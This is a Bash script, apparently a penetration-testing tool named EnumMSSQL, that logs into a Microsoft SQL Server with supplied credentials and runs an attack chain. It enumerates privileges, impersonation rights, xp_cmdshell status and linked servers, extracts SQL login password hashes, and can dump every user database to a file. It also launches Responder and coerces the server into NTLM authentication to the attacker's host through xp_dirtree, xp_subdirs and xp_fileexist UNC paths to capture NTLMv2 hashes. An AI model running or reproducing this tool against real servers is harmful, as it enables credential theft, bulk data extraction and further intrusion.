#!/usr/bin/env bash

# Self-heal terminal
stty sane 2>/dev/null
stty onlcr 2>/dev/null

# Colors for output & Sed Pipeline
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Hardcoded escape sequences for Sed
S_RED=$(printf '\033[0;31m')
S_YELLOW=$(printf '\033[1;33m')
S_GREEN=$(printf '\033[0;32m')
S_NC=$(printf '\033[0m')

# Default values
DOMAIN=""
RPORT="1433"
TMP_FILE="/tmp/.tmp_run_mssql_$$.sql"
WIN_AUTH=""
DUMP_MODE=0

# Trap CTRL+C and exit gracefully
trap cleanup EXIT INT TERM

cleanup() {
    if [[ -f "$TMP_FILE" ]]; then
        rm -f "$TMP_FILE"
    fi
    # Safely restore Responder database if we exit early
    for path in "/usr/share/responder" "/opt/Responder"; do
        if [[ -f "$path/Responder.db.bak" ]]; then
            sudo mv "$path/Responder.db.bak" "$path/Responder.db" 2>/dev/null
        fi
    done
}

banner() {
    echo -e "${YELLOW}"
    cat << "EOF"
 _____                       __  __ ____ ____   ___  _     
| ____|_ __  _   _ _ __ ___ |  \/  / ___/ ___| / _ \| |    
|  _| | '_ \| | | | '_ ` _ \| |\/| \___ \___ \| | | | |    
| |___| | | | |_| | | | | | | |  | |___) |__) | |_| | |___ 
|_____|_| |_|\__,_|_| |_| |_|_|  |_|____/____/ \__\_\_____| v2.3
EOF
    echo "                     https://github.com/tralsesec/EnumMSSQL   "
    echo -e "${NC}"
    echo -e "  Legend: ${RED}RED${NC} = High PrivEsc Vector | ${YELLOW}YELLOW${NC} = System Defaults"
    echo -e "=================================================================="
}

usage() {
    echo -e "Usage: $0 -u <user> -p <pass> -r <rhost> -l <lhost_or_interface> [options]"
    echo ""
    echo "Required:"
    echo "  -u, --user          Username for MSSQL authentication"
    echo "  -p, --pass          Password for MSSQL authentication"
    echo "  -r, --rhost         Target IP or Hostname"
    echo "  -l, --lhost         Local IP or Interface (e.g., tun0) for hash capture"
    echo ""
    echo "Optional:"
    echo "  -d, --domain        Domain name (Leave blank for local SQL auth)"
    echo "  -P, --rport         Target MSSQL Port (Default: 1433)"
    echo "  -w, --windows-auth  Use Windows Authentication"
    echo "  -D, --dump          DUMP MODE: Extract all non-system databases and tables to enum-mssql.dump"
    echo "  -h, --help          Show this help menu"
    exit 1
}

check_port_conflicts() {
    echo -e "${BLUE}[*] Checking for local port conflicts before launching Responder...${NC}"
    local ss_output=$(sudo ss -lptun 'sport = :80 or sport = :443 or sport = :445' 2>/dev/null | grep -v State)
    
    if [[ -n "$ss_output" ]]; then
        local formatted_conflicts=$(
            while read -r line; do
                if [[ -n "$line" ]]; then
                    local port=$(echo "$line" | grep -oP ':(80|443|445)\b' | head -n 1 | tr -d ':')
                    local pid=$(echo "$line" | grep -oP 'pid=\K[0-9]+' | head -n 1)
                    local proc_name=$(echo "$line" | grep -oP 'users:\(\("\K[^"]+' | head -n 1)
                    if [[ -z "$proc_name" ]]; then proc_name="Unknown Process"; fi
                    echo -e "    -> ${RED}Port $port${NC} is blocked by ${YELLOW}$proc_name${NC} (PID: $pid)"
                fi
            done <<< "$ss_output" | sort -u
        )
        
        if [[ -n "$formatted_conflicts" ]]; then
            echo -e "${YELLOW}[!] Warning: Port conflict detected! Sockets are currently occupied:${NC}"
            echo -e "$formatted_conflicts"
            
            echo -n -e "${YELLOW}[?] Automatically kill these processes to free up sockets? (y/N): ${NC}"
            read -r answer
            if [[ "$answer" =~ ^[Yy]$ ]]; then
                local pids=$(echo "$ss_output" | grep -oP 'pid=\K[0-9]+' | sort -u)
                for pid in $pids; do
                    sudo kill -9 "$pid" 2>/dev/null
                done
                echo -e "${GREEN}[+] Conflicting processes terminated.${NC}"
                sleep 1
            else
                echo -e "${RED}[!] Continuing anyway. Responder will likely fail to bind.${NC}"
            fi
        fi
    else
        echo -e "${GREEN}[+] No local port conflicts found.${NC}"
    fi
}

# Parse command line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u|--user) USER="$2"; shift ;;
        -p|--pass) PASS="$2"; shift ;;
        -d|--domain) DOMAIN="$2"; shift ;;
        -r|--rhost) RHOST="$2"; shift ;;
        -P|--rport) RPORT="$2"; shift ;;
        -l|--lhost) LHOST="$2"; shift ;;
        -w|--win-auth|--windows-auth) WIN_AUTH="-windows-auth" ;;
        -D|--dump) DUMP_MODE=1 ;;
        -h|--help) banner; usage ;;
        *) echo -e "${RED}[!] Unknown parameter passed: $1${NC}"; usage ;;
    esac
    shift
done

banner

if [[ -z "$USER" || -z "$PASS" || -z "$RHOST" || -z "$LHOST" ]]; then
    echo -e "${RED}[!] Missing required arguments.${NC}"
    usage
fi

if command -v impacket-mssqlclient &> /dev/null; then
    BINARY="impacket-mssqlclient"
elif command -v mssqlclient.py &> /dev/null; then
    BINARY="mssqlclient.py"
else
    echo -e "${RED}[!] Could not find 'impacket-mssqlclient' or 'mssqlclient.py' in PATH.${NC}"
    exit 1
fi

RESPONDER_IFACE=""
if ip link show "$LHOST" &> /dev/null; then
    RESOLVED_IP=$(ip -4 addr show "$LHOST" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    RESPONDER_IFACE="$LHOST"
else
    RESOLVED_IP="$LHOST"
    RESPONDER_IFACE=$(ip -o addr show | grep "$RESOLVED_IP" | awk '{print $2}' | head -n 1)
fi

if [[ -n "$DOMAIN" ]]; then
    TARGET_STRING="${DOMAIN}/${USER}:${PASS}@${RHOST}"
else
    TARGET_STRING="${USER}:${PASS}@${RHOST}"
fi

# ==============================================================================
# DUMP MODE EXECUTION
# ==============================================================================
if [[ "$DUMP_MODE" -eq 1 ]]; then
    echo -e "${BLUE}[*] DUMP MODE INITIATED.${NC}"
    echo -e "${BLUE}[*] Generating bulletproof T-SQL extraction payload...${NC}"
    
    cat << "EOF" > "$TMP_FILE"
EXEC sp_MSforeachdb 'IF ''?'' NOT IN (''master'', ''model'', ''msdb'', ''tempdb'') BEGIN PRINT ''=========================================''; PRINT ''[+] EXTRACTING DATABASE: ?''; PRINT ''=========================================''; USE [?]; EXEC sp_MSforeachtable @command1=''PRINT ''''[+] TABLE: &''''; SELECT * FROM &'', @replacechar=''&'' END';
EOF

    echo -e "${BLUE}[*] Executing payload and writing to ${GREEN}enum-mssql.dump${NC}... This may take a moment."
    
    $BINARY "$TARGET_STRING" -port "$RPORT" $WIN_AUTH -file "$TMP_FILE" 2>/dev/null \
        | tr -d '\r' \
        | grep -vE '(ENVCHANGE|Changed database context|Changed language setting|ACK: Result)' \
        | sed -E '/^ *SQL>/d' \
        | sed -E 's/^ \*? ?INFO\([^)]+\): Line [0-9]+: //g' \
        | awk '{printf "%s\r\n", $0}' > enum-mssql.dump
        
    if grep -q "\[+\] EXTRACTING DATABASE:" enum-mssql.dump; then
        echo -e "${GREEN}[+] Database extraction complete! Results saved to enum-mssql.dump${NC}"
    else
        echo -e "${YELLOW}[!] No custom databases found to dump (only system defaults exist or permission denied).${NC}"
        echo "Nothing to dump." > enum-mssql.dump
    fi
    exit 0
fi

# ==============================================================================
# NORMAL ENUMERATION EXECUTION
# ==============================================================================
echo -e "${BLUE}[*] LHOST configured: ${GREEN}$RESOLVED_IP${BLUE} on interface ${GREEN}$RESPONDER_IFACE${NC}"

if command -v responder &> /dev/null; then
    sudo -v 
    check_port_conflicts
    
    echo -e "${BLUE}[*] Temporarily backing up Responder DB to force hash display...${NC}"
    for path in "/usr/share/responder" "/opt/Responder"; do
        if [[ -f "$path/Responder.db" ]]; then
            sudo mv "$path/Responder.db" "$path/Responder.db.bak" 2>/dev/null
        fi
    done

    echo -e "${BLUE}[*] Launching Responder in the background on ${GREEN}$RESPONDER_IFACE${NC}..."
    sudo responder -I "$RESPONDER_IFACE" > /tmp/responder_catch.log 2>&1 < /dev/null &
    RESPONDER_PID=$!
    sleep 3 
else
    echo -e "${YELLOW}[!] Responder not found in PATH. Skipping hash capture listener...${NC}"
fi

echo -e "${BLUE}[*] Generating SQL execution file...${NC}"
cat << EOF > "$TMP_FILE"
PRINT '';
PRINT '=========================================';
PRINT '[+] PHASE 1: Basic Server Recon';
PRINT '=========================================';
PRINT '';
SELECT @@version AS 'Version';
PRINT '';
SELECT @@servername AS 'Server_Name', HOST_NAME() AS 'Client_Host';
PRINT '';
SELECT SYSTEM_USER AS 'System_User', USER_NAME() AS 'DB_User', DB_NAME() AS 'Current_DB';
PRINT '';
SELECT IS_SRVROLEMEMBER('sysadmin') AS 'Is_Sysadmin', IS_SRVROLEMEMBER('public') AS 'Is_Public';
PRINT '';

PRINT '=========================================';
PRINT '[+] PHASE 2: Privileges, Roles & Impersonation';
PRINT '=========================================';
PRINT '';
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
PRINT '';
SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin FROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid WHERE r.type IN ('S','E','X','U','G');
PRINT '';
SELECT distinct b.name AS 'Can_Impersonate_Login' FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.sid WHERE a.permission_name = 'IMPERSONATE';
PRINT '';

PRINT '=========================================';
PRINT '[+] PHASE 3: Databases & Trustworthy Status';
PRINT '=========================================';
PRINT '';
SELECT a.name AS 'database', b.name AS 'owner', is_trustworthy_on FROM sys.databases a JOIN sys.server_principals b ON a.owner_sid = b.sid;
PRINT '';

PRINT '=========================================';
PRINT '[+] PHASE 4: Tables in Current Database';
PRINT '=========================================';
PRINT '';
SELECT table_catalog, table_schema, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
PRINT '';

PRINT '=========================================';
PRINT '[+] PHASE 5: Execution Vectors (Cmdshell & OLE)';
PRINT '=========================================';
PRINT '';
SELECT 'xp_cmdshell' AS 'Execution_Vector', ISNULL((SELECT CAST(value_in_use AS VARCHAR) FROM sys.configurations WHERE name = 'xp_cmdshell'), 'DISABLED / NO ACCESS') AS 'Status' UNION ALL SELECT 'ole_automation', ISNULL((SELECT CAST(value_in_use AS VARCHAR) FROM sys.configurations WHERE name = 'ole automation procedures'), 'DISABLED / NO ACCESS') UNION ALL SELECT 'show_advanced_options', ISNULL((SELECT CAST(value_in_use AS VARCHAR) FROM sys.configurations WHERE name = 'show advanced options'), 'DISABLED / NO ACCESS');
PRINT '';

PRINT '=========================================';
PRINT '[+] PHASE 6: CLR Assemblies & Extended Procs';
PRINT '=========================================';
PRINT '';
SELECT name, permission_set_desc FROM sys.assemblies WHERE is_user_defined = 1;
PRINT '';
SELECT name, dll_name FROM sys.extended_procedures;
PRINT '';

PRINT '=========================================';
PRINT '[+] PHASE 7: Linked Server Auditing & Ghost Hunter';
PRINT '=========================================';
PRINT '';
EXEC sp_linkedservers;
PRINT '';
DECLARE @srv NVARCHAR(128); DECLARE c CURSOR FOR SELECT name FROM sys.servers WHERE is_linked = 1; OPEN c; FETCH NEXT FROM c INTO @srv; WHILE @@FETCH_STATUS = 0 BEGIN PRINT '--- Testing Link: ' + @srv + ' ---'; BEGIN TRY EXEC sp_testlinkedserver @srv; PRINT '[+] LINK ACTIVE: Server is reachable.'; DECLARE @rpc NVARCHAR(MAX) = 'EXEC (''IF EXISTS (SELECT 1 FROM sys.configurations WHERE name=''''xp_cmdshell'''' AND value_in_use=1) PRINT ''''[!] ALERT: xp_cmdshell is ENABLED on remote server!''''; ELSE PRINT ''''[-] xp_cmdshell is disabled on remote server.'''' '') AT [' + @srv + '];'; BEGIN TRY EXEC sp_executesql @rpc; END TRY BEGIN CATCH PRINT '[-] Cannot query remote configs (RPC Out likely disabled).'; END CATCH; END TRY BEGIN CATCH PRINT '[-] GHOST SERVER DETECTED: Connection Failed.'; PRINT '[-] ERROR: ' + ERROR_MESSAGE(); END CATCH; FETCH NEXT FROM c INTO @srv; END; CLOSE c; DEALLOCATE c;
PRINT '';

PRINT '=========================================';
PRINT '[+] PHASE 8: SQL Login Hash Extraction';
PRINT '=========================================';
PRINT '';
SELECT name, master.sys.fn_varbintohexstr(password_hash) AS 'password_hash' FROM sys.sql_logins WHERE password_hash IS NOT NULL;
PRINT '';

PRINT '=========================================';
PRINT '[+] PHASE 9: NTLM Hash Capture (SMB & WebDAV)';
PRINT '=========================================';
PRINT '';
EXEC master..xp_dirtree '\\\\${RESOLVED_IP}@80\\a';
EXEC master..xp_dirtree '\\\\${RESOLVED_IP}\\a';
EXEC master..xp_subdirs '\\\\${RESOLVED_IP}@80\\a';
EXEC master..xp_subdirs '\\\\${RESOLVED_IP}\\a';
EXEC master..xp_fileexist '\\\\${RESOLVED_IP}@80\\a';
EXEC master..xp_fileexist '\\\\${RESOLVED_IP}\\a';
PRINT '';
EOF

echo -e "${BLUE}[*] Executing payload against ${GREEN}$RHOST:$RPORT${NC}..."
echo -e "--------------------------------------------------------"

$BINARY "$TARGET_STRING" -port "$RPORT" $WIN_AUTH -file "$TMP_FILE" 2>/dev/null \
    | tr -d '\r' \
    | grep -vE '(ENVCHANGE|Changed database context|Changed language setting|ACK: Result)' \
    | sed -E '/^ *SQL>/d' \
    | sed -E 's/^ \*? ?INFO\([^)]+\): Line [0-9]+: //g' \
    | sed -E "s/(xp_cmdshell|is_trustworthy_on|sysadmin|password|passwd|pass|credential|creds|admin|hash|secret|token|GHOST SERVER DETECTED|ALERT)/${S_RED}\1${S_NC}/gi" \
    | sed -E "s/(LINK ACTIVE)/${S_GREEN}\1${S_NC}/gi" \
    | sed -E "s/(\bmaster\b|\bmsdb\b|\btempdb\b|\bmodel\b)/${S_YELLOW}\1${S_NC}/gi" \
    | awk '{printf "%s\r\n", $0}'

echo -e "--------------------------------------------------------"
echo -e "${GREEN}[+] SQL Execution complete.${NC}"

if [[ -n "$RESPONDER_PID" ]]; then
    sudo kill "$RESPONDER_PID" 2>/dev/null
    
    for path in "/usr/share/responder" "/opt/Responder"; do
        if [[ -f "$path/Responder.db.bak" ]]; then
            sudo mv "$path/Responder.db.bak" "$path/Responder.db" 2>/dev/null
        fi
    done
    
    echo -e "\n${BLUE}[*] Responder stopped and DB restored. Extracting hashes...${NC}"
    sleep 2 
    
    LOG_DIRS=("/usr/share/responder/logs" "/opt/Responder/logs")
    HASHES=""
    for dir in "${LOG_DIRS[@]}"; do
        if [[ -d "$dir" ]]; then
            FOUND=$(find "$dir" -type f -name "*.txt" -mmin -2 -exec cat {} + 2>/dev/null)
            if [[ -n "$FOUND" ]]; then
                HASHES="$FOUND"
            fi
        fi
    done

    if [[ -z "$HASHES" ]]; then
        HASHES=$(cat /tmp/responder_catch.log 2>/dev/null | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | grep -a -i "NTLMv2" | grep -v "Skipping")
    fi
    
    if [[ -n "$HASHES" ]]; then
        echo -e "${GREEN}================================================================================${NC}"
        echo -e "${RED}[+] HASHES CAPTURED!${NC}"
        echo -e "${GREEN}================================================================================${NC}"
        echo "$HASHES"
        echo -e "${GREEN}================================================================================${NC}"
    else
        echo -e "${YELLOW}[-] No hashes caught. The target firewall is likely dropping outbound SMB & WebDAV.${NC}"
        echo -e "${YELLOW}[-] (Check Phase 2: If Is_Sysadmin = 0, you might not have privileges to execute xp_dirtree)${NC}"
    fi
fi
